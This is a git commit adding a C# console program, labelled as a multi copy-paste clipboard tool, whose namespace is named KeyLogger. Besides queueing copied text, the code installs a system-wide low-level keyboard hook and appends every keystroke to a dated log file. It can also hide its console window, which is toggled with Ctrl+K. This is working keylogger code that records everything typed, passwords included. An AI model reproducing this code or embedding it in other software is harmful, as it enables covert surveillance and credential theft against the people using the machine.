1e2d0a80050d81ebd9bcdd7cfc3f27141375385d
nguyenhuy-iot <nguyenhuy.iot@gmail.com>
2021-03-04 21:39:05 +0700

    tool copy

---
+++ Tool/multi_copy_paste/ConsoleApp1/ConsoleApp1/Program.cs
@@ -0,0 +1,187 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace KeyLogger
+{
+    class Program
+    {
+        #region hook key board
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static string logName = "Log_";
+        private static string logExtendtion = ".txt";
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        /// <summary>
+        /// Delegate a LowLevelKeyboardProc to use user32.dll
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+        /// <summary>
+        /// Set hook into all current process
+        /// </summary>
+        /// <param name="proc"></param>
+        /// <returns></returns>
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            {
+                using (ProcessModule curModule = curProcess.MainModule)
+                {
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+                }
+            }
+        }
+
+        /// <summary>
+        /// Every time the OS call back pressed key. Catch them 
+        /// then cal the CallNextHookEx to wait for the next key
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                CheckHotKey(vkCode);
+                WriteLog(vkCode);
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        /// <summary>
+        /// Write pressed key into log.txt file
+        /// </summary>
+        /// <param name="vkCode"></param>
+        static void WriteLog(int vkCode)
+        {
+            //Console.WriteLine((Keys)vkCode);
+            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            StreamWriter sw = new StreamWriter(logNameToWrite, true);
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+
+        /// <summary>
+        /// Start hook key board and hide the key logger
+        /// Key logger only show again if pressed right Hot key
+        /// </summary>
+        static void HookKeyboard()
+        {
+            _hookID = SetHook(_proc);
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        static bool isHotKey = false;
+        static bool isShowing = false;
+        static Keys previoursKey = Keys.Separator;
+
+        static Queue<string> queue = new Queue<string>();
+
+        static void CheckHotKey(int vkCode)
+        {
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
+                isHotKey = true;
+            if (isHotKey)
+            {
+                if (!isShowing)
+                {
+                    DisplayWindow();
+                }
+                else
+                    HideWindow();
+
+                isShowing = !isShowing;
+            }
+            /////////////
+            if ((Keys)(vkCode) == Keys.F3 || (Keys)(vkCode) == Keys.Tab)    // F3 or tab : next
+            {    if (queue.Count != 0) 
+                {
+                    string text = queue.Dequeue();
+                    Clipboard.Clear();
+                    Clipboard.SetText(text);
+                    Console.WriteLine("next: " + text);
+                }
+            }
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.C) //copy
+            {
+                string item = Clipboard.GetText();
+                queue.Enqueue(item);
+                Console.WriteLine("input: " + item);                
+            }
+            ///////////////
+            previoursKey = (Keys)vkCode;
+            isHotKey = false;
+            
+
+        }
+        #endregion    
+
+        #region Windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        const int SW_HIDE = 0;
+
+        // show window code
+        const int SW_SHOW = 5;
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion
+        [STAThread]
+        static void Main(string[] args)
+        {
+            //HideWindow();
+            
+            HookKeyboard();
+        }
+    }
+}
